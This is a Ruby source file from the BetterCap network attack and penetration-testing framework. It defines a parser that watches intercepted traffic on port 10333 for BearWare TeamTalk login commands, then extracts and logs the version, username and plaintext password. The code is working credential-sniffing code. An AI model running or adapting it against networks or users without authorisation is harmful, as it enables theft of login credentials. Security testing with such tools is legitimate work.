=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

BearWare TeamTalk authentication parser:
  Author : Brendan Coles
  Email  : bcoles[at]gmail.com

This project is released under the GPL 3 license.

=end

module BetterCap
module Parsers
# BearWare TeamTalk authentication parser.
class TeamTalk < Base
  def initialize
    @name = 'TeamTalk'
  end
  def on_packet( pkt )
    return unless (pkt.tcp_dst == 10333 || pkt.udp_dst == 10333)

    lines = pkt.to_s.split(/\r?\n/)
    lines.each do |line|
      next unless (line =~ /login\s+/ && line =~ /username=/ && line =~ /password=/)

      version = line.scan(/version="?([\d\.]+)"?\s/).flatten.first
      user = line.scan(/username="?(.*?)"?\s/).flatten.first
      pass = line.scan(/password="?(.*?)"?\s/).flatten.first

      StreamLogger.log_raw( pkt, @name, "#{'version'.blue}=#{version} username=#{user} password=#{pass}" )
    end
  rescue
  end
end
end
end
